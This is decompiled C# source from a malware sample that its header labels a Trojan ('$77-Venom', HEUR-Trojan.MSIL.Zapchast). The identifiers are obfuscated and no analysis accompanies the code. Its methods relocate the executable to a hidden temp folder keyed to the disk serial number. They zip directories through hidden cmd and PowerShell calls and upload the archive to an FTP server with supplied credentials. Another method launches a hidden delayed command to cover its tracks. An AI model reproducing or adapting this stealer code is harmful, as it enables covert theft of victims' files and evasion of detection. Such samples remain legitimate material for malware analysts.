// Decompiled with JetBrains decompiler
// Type: 퓍弹䬝쟺꼻뺇༕賋㯱춠ꓧ溮㗯哈팛ꏈ褐◴Ѱ
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;

public class 퓍弹䬝쟺꼻뺇\u0F15賋㯱춠ꓧ溮㗯哈팛ꏈ褐\uE93E\u25F4Ѱ
{
  private const string 먕ﲯ㸆胧뭬幐ᾜ垤\uF659\uF2E9ৌ๊\uFFFD犜\uF790ᮚ३伳앗錶 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  private static readonly Random 카\uFFFD녦ﶥ\uFAEE㫗箦ᓳ\u3208䑉쀤燘鳭홬曾寡辈嫝鈹졙 = new Random(Environment.TickCount);

  public static string ﱍ歁䅔\uF439攑婢\uFFFD눔\u0834댟꺤͜\u1AE5錦멟Ẏ懳傦姤픸() => Path.GetRandomFileName().Replace(".", "");

  public static void \uA8E3芫羴卹句㩚즤쭰ꉧ䂮願ⳍ\uFFFDζ糴櫓伫餑붬ꖊ(string dir)
  {
    string path = Environment.GetEnvironmentVariable("temp") + "\\" + 퓍弹䬝쟺꼻뺇\u0F15賋㯱춠ꓧ溮㗯哈팛ꏈ褐\uE93E\u25F4Ѱ.秛嵴\u0F16讶燗抒\u9FE8鍀蒭ﰈ㣢늚㰣䱤\uEA80㠒솞\u2AE9\u2BF1쫧();
    if (!Directory.Exists(path))
      return;
    Directory.Delete(path);
  }

  public static void 聫횧\uED53럧翮灝ᥑⳬ\u21A2㒂娩\uE971묛尢ᖣ신祖\uE647諁\u2F5D(string name) => Process.Start(new ProcessStartInfo()
  {
    Arguments = "/C choice /C Y /N /D Y /T 1 & \"" + name + " --zip\"",
    WindowStyle = ProcessWindowStyle.Hidden,
    CreateNoWindow = true,
    FileName = "cmd.exe"
  });

  public static string 秛嵴\u0F16讶燗抒\u9FE8鍀蒭ﰈ㣢늚㰣䱤\uEA80㠒솞\u2AE9\u2BF1쫧()
  {
    string str = "";
    try
    {
      ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":\"");
      managementObject.Get();
      str = managementObject["VolumeSerialNumber"].ToString();
    }
    catch (Exception ex)
    {
    }
    return str;
  }

  public static void Ņ㟺頺\uE6D4\uD7AE鍵ꑶ뺠姙槐撜笈爝웱뺨猶\u281E暴딘㚆(string dir, string zipPath) => Process.Start(new ProcessStartInfo()
  {
    FileName = "cmd",
    Arguments = "/k start /b powershell Compress-Archive -Path " + dir + " -DestinationPath " + zipPath + " & exit",
    CreateNoWindow = true,
    WindowStyle = ProcessWindowStyle.Hidden,
    UseShellExecute = true,
    ErrorDialog = false
  });

  public static string \u07F2旘谅偁ὠ\uFFFD\u0EF3ꋍ\uFFFD鰯䆒駶ၔ뜽췈㻢\uFFFDਐ젣\u287A()
  {
    try
    {
      string path = Environment.GetEnvironmentVariable("Temp") + "\\" + 퓍弹䬝쟺꼻뺇\u0F15賋㯱춠ꓧ溮㗯哈팛ꏈ褐\uE93E\u25F4Ѱ.秛嵴\u0F16讶燗抒\u9FE8鍀蒭ﰈ㣢늚㰣䱤\uEA80㠒솞\u2AE9\u2BF1쫧();
      Directory.CreateDirectory(path);
      System.IO.File.Move(Directory.GetCurrentDirectory() + "\\" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name, path + "\\temp.exe");
      return path;
    }
    catch (Exception ex)
    {
    }
    return (string) null;
  }

  public static void ꑰ듾\u2833\u2F86ƥ\u24CD䍉ȣ嵿更䑊ꠗ籴\uF0B9ᯔ닧魉ߝ獞냃(
    string FTPAddress,
    string zipName,
    string username,
    string password)
  {
    FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(FTPAddress + "/" + Path.GetFileName(zipName));
    ftpWebRequest.Method = "STOR";
    ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(username, password);
    ftpWebRequest.UsePassive = true;
    ftpWebRequest.UseBinary = true;
    ftpWebRequest.KeepAlive = false;
    FileStream fileStream = System.IO.File.OpenRead(zipName);
    byte[] buffer = new byte[fileStream.Length];
    fileStream.Read(buffer, 0, buffer.Length);
    fileStream.Close();
    Stream requestStream = ftpWebRequest.GetRequestStream();
    requestStream.Write(buffer, 0, buffer.Length);
    requestStream.Close();
  }
}
